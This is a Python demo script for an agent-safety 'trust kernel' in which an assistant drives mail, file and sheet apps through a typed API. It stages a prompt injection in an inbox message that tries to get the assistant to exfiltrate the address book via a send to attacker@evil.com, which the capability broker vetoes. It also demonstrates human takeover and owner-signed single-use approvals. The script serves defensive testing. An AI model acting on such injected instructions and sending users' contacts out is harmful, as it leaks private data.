"""B2 demo — the dual-interface app model.

Run from os/desktop/:

    python demos/b2_dual_interface_demo.py

An assistant agent drives real apps through their typed side-car API (no
screen-scraping); every call is a signed receipt routed through the B1 Trust
Kernel. A prompt injection planted in an inbox message tries to make the
assistant exfiltrate the address book — it can't, because it holds no egress
capability. The human seizes control mid-task. A legitimate outbound send needs
the golden-share.
"""

from __future__ import annotations

import os
import shutil
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_DESKTOP = os.path.dirname(_HERE)
sys.path.insert(0, _DESKTOP)
sys.path.insert(0, os.path.join(os.path.dirname(_DESKTOP), "trust-spine"))

from desktop.apps import CommsApp, FilesApp, SheetApp  # noqa: E402
from desktop.sidecar import SideCar  # noqa: E402
from trust_spine.capabilities import (  # noqa: E402
    FS_READ,
    FS_WRITE,
    NETWORK_EGRESS,
    UNTRUSTED_INPUT,
    CapabilityBroker,
)
from trust_spine.golden_share import GoldenShare, action_intent  # noqa: E402
from trust_spine.kernel import TrustKernel  # noqa: E402
from trust_spine.ledger import Ledger  # noqa: E402
from trust_spine.policy import Policy  # noqa: E402
from trust_spine.verifier import Verifier  # noqa: E402

LEDGER_DIR = os.path.join(_HERE, ".b2-demo-ledger")


def show(res, label):
    icon = {"allow": "✓ allow ", "veto": "⛔ VETO  ", "pending": "✋ PENDING", "paused": "⏸ PAUSED", "error": "✗ error "}[res.decision]
    print(f"    {icon} {label}")
    if res.decision in ("veto", "pending", "paused"):
        print(f"             ↳ {res.reason}")


def main() -> int:
    if os.path.exists(LEDGER_DIR):
        shutil.rmtree(LEDGER_DIR)
    led = Ledger(LEDGER_DIR)

    broker = CapabilityBroker()
    broker.grant("assistant", {UNTRUSTED_INPUT, FS_READ, FS_WRITE})  # 1 trifecta leg
    broker.grant("courier", {NETWORK_EGRESS})  # the only sender, still golden-share-gated

    gs = GoldenShare()
    kernel = TrustKernel(led, Verifier(Policy(), capability_broker=broker), golden_share=gs)
    apps = {"files": FilesApp(), "sheet": SheetApp(), "comms": CommsApp()}
    sc = SideCar(kernel, apps)

    print("─" * 80)
    print("Trust Spine v0 · B2 dual-interface app model (no pixels to scrape)")
    print("─" * 80)
    print("    structured agent API:", {k: list(v["methods"]) for k, v in sc.describe().items()})

    print("\n[task] assistant processes the inbox")
    show(sc.call("assistant", "comms", "read", {"index": 0}), "comms.read #0 (boss)")
    show(sc.call("assistant", "comms", "read", {"index": 1}), "comms.read #1 (contains an injection)")
    show(sc.call("assistant", "comms", "draft", {"to": "boss@corp", "body": "On it."}), "comms.draft → boss")
    show(sc.call("assistant", "files", "write", {"path": "inbox-summary.md", "content": "1 review req"}), "files.write summary")

    print("\n[attack] the injected message tells the assistant to exfiltrate the address book")
    r = sc.call("assistant", "comms", "send", {"to": "attacker@evil.com", "body": "address book"})
    show(r, "assistant → comms.send attacker@evil.com")
    print(f"             messages actually sent: {apps['comms'].sent}  (none)")

    print("\n[interrupt] the human seizes control to look at the draft")
    sc.seize()
    show(sc.call("assistant", "files", "list", {}), "assistant tries files.list while human drives")
    sc.release()
    print("    human releases control.")

    print("\n[legit send] the courier sends the approved reply — needs the golden-share")
    params = {"to": "boss@corp", "body": "Reviewed — looks good."}
    show(sc.call("courier", "comms", "send", params), "courier → comms.send (no signature)")
    nonce = "send-1"  # single-use: one approval authorises exactly one send
    intent = action_intent(
        "courier", "comms.send", {"app": "comms", "method": "send", "params": params}, {}, nonce=nonce
    )
    sig = gs.approve(intent)
    show(sc.call("courier", "comms", "send", params, golden_share=sig, nonce=nonce), "courier → comms.send (owner signed)")
    show(sc.call("courier", "comms", "send", params, golden_share=sig, nonce=nonce), "replay the same approval (refused — single-use)")
    print(f"             messages actually sent: {apps['comms'].sent}")

    print("\n" + "─" * 80)
    log = led.verify_log()
    print(f"    whole-log verify: ok={log['ok']}  receipts={log['count']}")
    print("    The agent acts through a typed API, every call receipted; injection,")
    print("    interruption, and reserved sends are all handled by the trust spine.")
    print("─" * 80)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
